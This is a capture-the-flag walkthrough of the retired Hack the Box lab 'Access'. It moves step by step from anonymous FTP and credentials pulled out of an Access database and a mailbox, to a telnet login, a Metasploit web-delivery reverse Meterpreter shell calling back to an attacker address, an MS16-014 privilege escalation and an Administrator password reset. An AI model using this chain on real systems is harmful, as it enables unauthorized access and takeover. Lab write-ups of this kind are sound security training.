									Today we are going to solve another CTF challenge “Access”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
Level: Easy
Task: To find user.txt and root.txt file
Note: Since these labs are online available therefore they have a static IP. The IP of Access is 10.10.10.98.
Penetrating Methodologies:

Network scanning (nmap).
Logging in FTP using Anonymous Login.
Using strings to read contents of the .mdb file.
Unzipping Zip file using 7z.
Using readpst to read the contents of the .pst file.
Finding Login Credentials
Logging into Telnet.
Finding the first flag user.txt
Using web delivery module to create PowerShell code.
Getting Meterpreter.
Using exploit suggester of Metasploit.
Getting Root Access.
Changing the Administrator password using net user.
Reading Our Final flag root.txt

Walkthrough
Let’s start off with scanning the network to find our target.

		
		
			
			
			
			
nmap -p- -A 10.10.10.98
			
				
					
				
					1
				
						nmap -p- -A 10.10.10.98
					
				
			
		


The first thing that got our attention is that we have anonymous access to the ftp server. Let’s login and see what we find.
After successfully logging into FTP server, we have enumerated directories from where we have downloaded two files Access Control.zip and backup.mdb. They might come in handy later on.

		
		
			
			
			
			
ftp 10.10.10.98
			
				
					
				
					1
				
						ftp 10.10.10.98
					
				
			
		

When we tried to unzip the zip file found out that it was password protected. So we tried to open the backup.mdb file and found a password to the zip file.

		
		
			
			
			
			
strings backup.mdb | grep access
			
				
					
				
					1
				
						strings backup.mdb | grep access
					
				
			
		


Once we have obtained the password for the Access Control.zip. Time to unzip it. After unzipping we saw its a .pst which is a Microsoft Exchange Format for mailboxes. Using readpst it converted the file into the .mbox format.

		
		
			
			
			
			
7z x Access\ Control.zip
readpst 'Access Control.pst'
			
				
					
				
					12
				
						7z x Access\ Control.zipreadpst 'Access Control.pst'
					
				
			
		

Let’s read the contents of the Access Control.mbox.

		
		
			
			
			
			
less 'Access Control.mbox'
			
				
					
				
					1
				
						less 'Access Control.mbox'
					
				
			
		


After reading the contents, we saw that user credentials that surely going to help us to move ahead.

		
		
			
			
			
			
Username- security
Password- 4Cc3ssC0ntr0ller
			
				
					
				
					12
				
						Username- securityPassword- 4Cc3ssC0ntr0ller
					
				
			
		


Let’s login into telnet using our new credentials. After enumerating through directories, we have found our first flag.

		
		
			
			
			
			
telnet 10.10.10.98
dir
cd Desktop
type user.txt
			
				
					
				
					1234
				
						telnet 10.10.10.98dircd Desktoptype user.txt
					
				
			
		

 
Let’s create a shellcode generated via the web delivery module of Metasploit.

		
		
			
			
			
			
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.6
exploit
			
				
					
				
					12345
				
						use exploit/multi/script/web_deliveryset target 2set payload windows/x64/meterpreter/reverse_tcpset lhost 10.10.14.6exploit
					
				
			
		


Now we will execute the PowerShell code generated via the web delivery module.

We have successfully got the meterpreter. Moving forward.

		
		
			
			
			
			
getuid
getsystem
sysinfo
			
				
					
				
					123
				
						getuidgetsystemsysinfo
					
				
			
		


After that, we have used exploit suggester which has given us all the possible exploits for the operating system of the Victims system.

		
		
			
			
			
			
use post/multi/recon/local_exploit_suggester
set session 1
exploit
			
				
					
				
					123
				
						use post/multi/recon/local_exploit_suggesterset session 1exploit
					
				
			
		


Using the exploit ms16_014_wmirecv_notif of Metasploit.

		
		
			
			
			
			
use exploit/windows/local/ms16_014_wmi_recv_notif
set lhost 10.10.14.6
set session 1
set lport 1234
exploit
			
				
					
				
					12345
				
						use exploit/windows/local/ms16_014_wmi_recv_notifset lhost 10.10.14.6set session 1set lport 1234exploit
					
				
			
		

oh yeah! We have got the root access.

		
		
			
			
			
			
whoami
			
				
					
				
					1
				
						whoami
					
				
			
		


Now we changed the password for Administrator because we can use it to login via telnet.

		
		
			
			
			
			
net user
net user Administrator Ignite@123
			
				
					
				
					12
				
						net usernet user Administrator Ignite@123
					
				
			
		


Here we successfully logged in via Telnet and found our final flag.

		
		
			
			
			
			
telnet 10.10.10.98
login: administrator
password: Ignite@123
cd Desktop
type root.txt
			
				
					
				
					12345
				
						telnet 10.10.10.98login: administratorpassword: Ignite@123cd Desktoptype root.txt
